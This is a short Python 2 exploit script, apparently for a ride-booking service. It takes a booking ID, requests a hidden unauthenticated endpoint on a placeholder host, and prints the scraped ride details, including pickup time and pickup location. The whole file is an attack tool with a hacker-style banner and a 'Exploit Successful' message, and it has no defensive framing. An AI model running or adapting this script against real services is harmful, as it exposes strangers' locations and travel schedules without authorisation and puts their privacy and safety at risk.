#!/usr/bin/python
# Ride Info Exploit
# Vulnerability Identified by: Shawar Khan
# Exploit Coded by Shawar Khan

import sys
import os
import urllib
from BeautifulSoup import BeautifulSoup
if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')

print '''
 ____   ___   ____ 
|  _ \ / _ \ / ___|
| |_) | | | | |    
|  __/| |_| | |___ 
|_|    \___/ \____|

 		Ride Information Gather Exploit
 		Coded by Shawar Khan( www.shawarkhan.com)
'''
try:
	bookingid = sys.argv[1]
	url = 'https://site.com/url/hidden/endpoint/%s/location'%bookingid
	print "[*] Exploit Start..."
	print "[*] Getting Information for ID [ %s ]"%bookingid
	source = urllib.urlopen(url).read()
	soup = BeautifulSoup(source)
	notfound = '0'
	found = []
	for i in soup.body.table:
		thedata = str(BeautifulSoup(str(i)).findAll('td')).replace('<strong>','').replace('</strong>','').replace('<td>','').replace('</td>','').replace('<br','').replace('/>','').split(',')
		if len(thedata) == 2:
			if len(thedata[1]) == 0:
				notfound = '1'
			else:
				if len(thedata[1][:-1].strip()) == 0 and thedata[0][1:] == 'Pickup Time':
					notfound = '1'
				else:
					if "Pickup location" in thedata[0]:
						valid_data = '    '+str(thedata[0][2:])+' : '+str(thedata[1][:-1].strip())
					else:
						valid_data =  '    '+str(thedata[0][1:])+' : '+str(thedata[1][:-1])
					found.append(valid_data)

	if notfound == '1':
		print "[*] Invalid ID / No Information"
	else:
		print '\n[*] Ride information:'
		for i in found:
			print i
		print '\n[*] Exploit Successful...'
except(KeyboardInterrupt):
	print("\n[*] Error Occured...")
	print("[*] Exiting Exploit...")
